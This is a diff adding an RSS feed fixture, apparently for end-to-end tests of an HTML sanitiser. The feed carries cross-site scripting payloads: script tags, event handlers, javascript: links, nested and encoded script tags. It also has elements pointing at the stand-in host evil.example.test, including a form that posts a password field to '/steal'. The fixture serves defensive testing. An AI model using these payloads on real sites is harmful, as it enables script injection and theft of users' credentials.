@@ -1,0 +1,44 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Hostile HTML &lt;script&gt;alert('channel')&lt;/script&gt;</title>
+    <link>javascript:alert('channel-link')</link>
+    <description>Feed content that tries to run script. Every payload must be neutralised by the sanitiser; see e2e/fixtures/xss/payloads.json for the full set.</description>
+    <item>
+      <title>&lt;img src=x onerror=alert('title')&gt;</title>
+      <link>javascript:alert('item-link')</link>
+      <guid isPermaLink="false">hostile-1</guid>
+      <pubDate>Tue, 10 Nov 2026 09:00:00 GMT</pubDate>
+      <description><![CDATA[<script>alert('desc')</script><p onclick="alert('onclick')">click</p>]]></description>
+      <content:encoded><![CDATA[
+        <p>Hello</p>
+        <script>window.__pwned = 'script'</script>
+        <img src="x" onerror="window.__pwned = 'img'">
+        <a href="javascript:window.__pwned='href'">js link</a>
+        <iframe src="https://evil.example.test/frame"></iframe>
+        <svg onload="window.__pwned='svg'"><script>window.__pwned='svgscript'</script></svg>
+        <form action="https://evil.example.test/steal"><input name="pw" type="password"></form>
+        <style>body{display:none}</style>
+        <meta http-equiv="refresh" content="0;url=https://evil.example.test/">
+        <base href="https://evil.example.test/">
+        <object data="https://evil.example.test/x.swf"></object>
+        <div style="background:url(javascript:alert(1))">styled</div>
+        <a href="https://ok.example.test/" target="_blank">target blank without rel</a>
+      ]]></content:encoded>
+    </item>
+    <item>
+      <title>Entity-encoded script</title>
+      <link>https://hostile.example.test/2</link>
+      <guid isPermaLink="false">hostile-2</guid>
+      <pubDate>Tue, 10 Nov 2026 08:00:00 GMT</pubDate>
+      <description>&lt;scr&lt;script&gt;ipt&gt;alert('nested')&lt;/scr&lt;/script&gt;ipt&gt; &amp;lt;script&amp;gt;alert('double')&amp;lt;/script&amp;gt;</description>
+    </item>
+    <item>
+      <title>Huge attribute</title>
+      <link>https://hostile.example.test/3</link>
+      <guid isPermaLink="false">hostile-3</guid>
+      <pubDate>Tue, 10 Nov 2026 07:00:00 GMT</pubDate>
+      <description><![CDATA[<a href="https://hostile.example.test/#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">long fragment</a>]]></description>
+    </item>
+  </channel>
+</rss>
